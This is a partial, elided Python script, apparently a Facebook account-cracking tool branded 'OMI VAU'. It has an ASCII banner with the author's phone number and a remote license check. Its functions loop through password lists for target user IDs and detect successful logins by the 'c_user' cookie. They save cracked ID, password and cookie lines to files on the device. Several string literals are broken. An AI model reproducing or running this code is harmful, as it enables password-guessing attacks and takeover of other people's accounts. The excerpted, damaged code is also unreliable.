...
try:
    ...
    exit()
def banner():
    print("[=] ðŸ˜Œ Testing New mathod By OMI VAU")
...
o888   888o 8888o   888   888  
888     888 88 888o8 88   888  
888o   o888 88  888  88   888  
  88ooo88  o88o  8  o88o o888o                                                                                                                                   
                \33[1;30m𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐭𝐨 𝐦𝐲 𝐰𝐨𝐫𝐥𝐝 ♚
\33[92;1m ▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃
\33[38;5;46m ▊   ‌‌‌‌‌‌                                              ██
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐀𝐮𝐭𝐡𝐨𝐫    \33[38;5;196m: \3[97;1mOMI HASAN  ♚   \33[38;5;46m               ▇▎ 
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐅𝐚𝐜𝐞𝐛𝐨𝐨𝐤  \33[38;5;196m: \33[1;92m Omi Hasan  ( 𝐌 )  \33[38;5;46m           ▇▎  
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩  \33[38;5;196m: \33[1;92m+𝟖𝟖𝟎1406115895 \33[38;5;46m                  ▇▎
\33[38;5;46m ▊\33[93;1m❥\33[92;1m⋆\33[93;1m❦ \33[97;1m𝐆𝐢𝐭𝐡𝐮𝐛    \33[38;5;196m: \33[1;92mhttps://github.com/OMIdark\33[38;5;46m ▇▎
...
def admin():
	...
	if bal =='2':
		...
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/OMIdark');time.sleep(1)
		admin()
	if bal =='0':
		Main()
def hoga_check():
  uuid =  str(os.geteuid()) + str(os.getlogin()) 
  id = "OMI VAU-𝐌-x0x0x" + "|".join(uuid)
  os.system("clear")
  print(logo)
  print("\33[38;5;46m  ❥▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃❦")
  ...
  try: 
    httpCaht = requests.get("https://raw.githubusercontent.com/YOUSUF-NIZAMI/RANDOM/main/Apruval.txt").text 
    if id in httpCaht: 
...
def a(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\ \33[1;90m[\33[1;93mOMI VAU\33[1;90m] \33[1;96m%s/%s\33[1;90m \33[1;90m[\33[1;92mOK:%s\33[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'{W}CP-UA--> {pro}\ ')
                open('/sdcard/OMI VAU-CP.txt', 'a').write( uid+' | '+ps+' \')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\\33[m[OMI VAU] \33[1;92m%s\33[m |\33[m[\33[mOK:\33[1;92m%s\33[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \{R} [{B}OMI VAU{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€�{P}[{H}{ok}{P}]Ã¢â‚¬â€�{P}[{k}{cp}{x}]Ã¢â‚¬â€�[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\\33[1;92m [🚀] COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/OMI VAU-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\')
                break
            else:
                continue
        loop+=1        
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/OMI VAU-ok.txt', 'a').write(cid+' | '+ps+'\')
                break
            else:
                continue
        loop+=1        
